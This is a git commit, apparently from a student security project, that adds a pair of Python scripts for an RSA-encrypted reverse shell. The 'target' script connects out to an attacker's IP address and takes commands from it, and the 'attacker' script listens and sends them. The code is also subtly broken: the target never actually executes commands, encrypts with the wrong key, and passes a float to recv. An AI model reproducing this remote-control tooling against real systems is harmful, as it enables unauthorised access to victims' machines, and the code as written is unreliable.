2471e4f84c522d5d1ae258edff73306f25c92352
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-01 13:38:29 -0600

    trying handshake

---
+++ attacker-dhruv.py
@@ -0,0 +1,34 @@
+from cryptidy import asymmetric_encryption
+import socket
+import subprocess
+import base64
+
+HOST = '10.0.2.4' # Listen on all network interfaces
+PORT = 12345  # Choose a port number
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(1)
+print(f"Listening on {HOST}:{PORT}")
+conn, addr = s.accept()
+print(f"Connection from {addr}")
+
+priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
+print(f'attacker priv key: {priv_key}')
+print(f'attacker pub key: {pub_key}')
+conn.send(pub_key)
+
+target_pub_key = conn.recv(2048 / 8)
+
+while True:
+    command = input("Enter command to execute or 'exit' to quit: ")
+    if command.lower() == 'exit':
+        conn.send(b'exit')
+        conn.close()
+        break
+    conn.send(command.encode())
+    encrypted_output_b64 = conn.recv(1024)
+    encrypted_output = base64.b64decode(encrypted_output_b64)
+    output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
+    print(output, end="")
+s.close()
+
---
+++ target-dhruv.py
@@ -0,0 +1,29 @@
+from cryptidy import asymmetric_encryption
+import socket
+import subprocess
+import os
+import base64
+
+HOST = '10.0.2.4'  # Attacker's IP address
+PORT = 12345  # Same port number used in the listener
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
+print(f'target priv key: {priv_key}')
+print(f'target pub key: {pub_key}')
+s.send(pub_key)
+
+attacker_pub_key = s.recv(2048 / 8)
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode('utf-8') == 'cd':
+        os.chdir(data[3:].decode('utf-8'))
+    if len(data) > 0:
+        encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
+        encrypted_data_b64 = base64.b64encode(encrypted_data)
+        s.send(encrypted_data_b64)
+    else:
+        s.send(b' ')
+s.close()
